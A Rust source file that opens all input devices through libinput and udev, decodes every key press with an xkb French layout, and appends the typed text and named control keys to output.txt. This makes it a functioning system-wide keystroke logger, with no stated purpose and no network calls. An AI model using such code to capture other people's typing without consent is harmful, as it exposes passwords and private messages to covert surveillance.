extern crate input;
extern crate libc;
extern crate nix;
extern crate std;
extern crate udev;

use input::event::device::DeviceEvent::Added;
use input::event::keyboard::KeyState;
use input::event::keyboard::KeyboardEvent::Key;
use input::event::keyboard::KeyboardEventTrait;
use input::event::EventTrait;
use input::Event::{Device, Keyboard};
use input::Libinput;
use nix::poll;
use nix::unistd::close;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::FromRawFd;
use std::os::unix::io::IntoRawFd;
use std::os::unix::io::{AsRawFd, RawFd};
use std::path::Path;
use std::process::exit;
use udev::Context;
use xkbcommon::xkb;
use xkbcommon::xkb::{keysym_get_name, keysym_to_utf8, keysyms, Keysym, State};

struct InputInterface;

impl input::LibinputInterface for InputInterface {
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32> {
        let mut options = OpenOptions::new();
        options.read(true).write(true).custom_flags(flags);
        options
            .open(path)
            .map_err(|e| e.raw_os_error().unwrap())
            .map(|x| x.into_raw_fd())
    }

    fn close_restricted(&mut self, fd: RawFd) {
        close(fd).unwrap()
    }
}


// TODO Clean the shit outta this function
// TODO find automatically the keyboard layout
// TODO Handle better the way key modifiers are handled (ctrl + t, etc)
fn main() {
    // Libinput part - controls the hardware key receiving end
    let input_interface = InputInterface {};
    let udev_context = Context::new().unwrap();
    let mut libinput_context = Libinput::new_from_udev(input_interface, &udev_context);
    libinput_context.udev_assign_seat("seat0").unwrap();
    libinput_context.dispatch().unwrap();

    // Kbd part - controls the conversion between key presses and char shown
    let context = xkb::Context::new(xkb::CONTEXT_NO_FLAGS);
    let keymap = xkb::Keymap::new_from_names(
        &context,
        "",
        "",
        "fr",
        "latin9",
        None,
        xkb::KEYMAP_COMPILE_NO_FLAGS,
    )
    .unwrap();
    let mut state = xkb::State::new(&keymap);

    let fd = libinput_context.as_raw_fd();
    let pollfd = poll::PollFd::new(fd, poll::POLLIN);

    let mut output_file = File::create("output.txt").unwrap();
    let non_print_keys = vec![
        keysyms::KEY_Control_L,
        keysyms::KEY_Control_R,
        keysyms::KEY_Delete,
        keysyms::KEY_DeleteChar,
        keysyms::KEY_DeleteLine,
        keysyms::KEY_BackSpace,
        keysyms::KEY_Tab,
        keysyms::KEY_Tab,
        keysyms::KEY_Alt_L,
        keysyms::KEY_Alt_R,
        keysyms::KEY_Up,
        keysyms::KEY_Down,
        keysyms::KEY_Left,
        keysyms::KEY_Right,
        keysyms::KEY_Escape,
        keysyms::KEY_Return,
        keysyms::KEY_F1,
        keysyms::KEY_F2,
        keysyms::KEY_F3,
        keysyms::KEY_F4,
        keysyms::KEY_F5,
        keysyms::KEY_F6,
        keysyms::KEY_F7,
        keysyms::KEY_F8,
        keysyms::KEY_F9,
        keysyms::KEY_F10,
        keysyms::KEY_F11,
        keysyms::KEY_F12,
        keysyms::KEY_F13,
        keysyms::KEY_F14,
        keysyms::KEY_F15,
        keysyms::KEY_F16,
        keysyms::KEY_F17,
        keysyms::KEY_F18,
        keysyms::KEY_F19,
    ];

    while poll::poll(&mut [pollfd], -1).is_ok() {
        libinput_context.dispatch().unwrap();
        let mut events = libinput_context.clone().filter_map(|event| match event {
            Keyboard(Key(key)) => Some(key),
            _ => None,
        });
        for event in events {
            let keycode = event.key();
            let key_state = event.key_state();

            let (direction, display) = match key_state {
                KeyState::Pressed => (xkb::KeyDirection::Down, true),
                KeyState::Released => (xkb::KeyDirection::Up, false),
            };

            let state_components = state.update_key(keycode + 8, direction);

            let mut mod_changed = false;
            let sym = state.key_get_one_sym(keycode + 8);
            let mut keystroke = keysym_to_utf8(sym).into_bytes();
            keystroke.pop();

            if !display {
                continue;
            }

            if non_print_keys.contains(&sym) {
                let str_to_write = format!("<{}>", keysym_get_name(sym));
                output_file.write_all(&str_to_write.into_bytes());
            } else if !mod_changed {
                output_file.write_all(&keystroke);
            }
        }
    }
}
